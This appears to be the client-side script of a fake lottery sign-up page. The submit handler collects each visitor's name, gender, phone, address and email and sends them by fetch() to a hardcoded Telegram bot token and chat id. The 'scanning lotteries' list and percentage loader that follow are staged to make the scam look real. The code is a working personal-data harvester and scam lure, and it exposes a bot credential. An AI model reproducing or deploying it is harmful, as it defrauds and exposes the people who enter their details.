document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("lotteryForm");
    const lotteryGame = document.getElementById("lotteryGame");
    const scanButton = document.getElementById("scanLotteries");
    const lotteryNamesDiv = document.getElementById("lotteryNames");
    const loadingText = document.getElementById("loadingLottery");
    const loadingPercentage = document.getElementById("loadingPercentage");
    const goForItButton = document.getElementById("goForIt");
    const spinningWheelGame = document.getElementById("spinningWheelGame");

    form.addEventListener("submit", function (e) {
        e.preventDefault();
        let fullName = document.getElementById("fullName").value;
        let gender = document.getElementById("gender").value;
        let phone = document.getElementById("phone").value;
        let address = document.getElementById("address").value;
        let email = document.getElementById("email").value;

        let message = `New Lottery Registration:\nName: ${fullName}\nGender: ${gender}\nPhone: ${phone}\nAddress: ${address}\nEmail: ${email}`;

        let telegramAPI = `https://api.telegram.org/bot<7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY>/sendMessage?chat_id=<874563737>&text=${encodeURIComponent(message)}`;
        fetch(telegramAPI).then(() => {
            form.style.display = "none";
            lotteryGame.style.display = "block";
        });
    });

    scanButton.addEventListener("click", function () {
        scanButton.style.display = "none";
        const lotteryNames = [
            "Arizona Lottery", "Arkansas Scholarship Lottery", "Cash 5 (Colorado)", "Classic Lotto 47",
            "Colorado Lottery", "D.C. Lottery", "Daily Derby", "Dakota Cash", "Delaware Lottery", 
            "Hoosier Lottery", "Hoosier Lotto", "Hot Lotto", "Idaho Lottery", "Illinois State Lottery",
            "Kansas Lottery", "Lotto (Missouri)", "Louisiana Lottery Corporation"
        ];

        let index = 0;
        let interval = setInterval(() => {
            if (index < lotteryNames.length) {
                lotteryNamesDiv.innerHTML = lotteryNames[index];
                index++;
            } else {
                clearInterval(interval);
                lotteryNamesDiv.style.display = "none";
                loadingText.style.display = "block";

                let percent = 1;
                let loadInterval = setInterval(() => {
                    if (percent <= 100) {
                        loadingPercentage.innerText = percent + "%";
                        percent++;
                    } else {
                        clearInterval(loadInterval);
                        loadingText.style.display = "none";
                        goForItButton.style.display = "block";
                    }
                }, 50);
            }
        }, 200);
    });

    goForItButton.addEventListener("click", function () {
        lotteryGame.style.display = "none";
        spinningWheelGame.style.display = "block";
    });
});
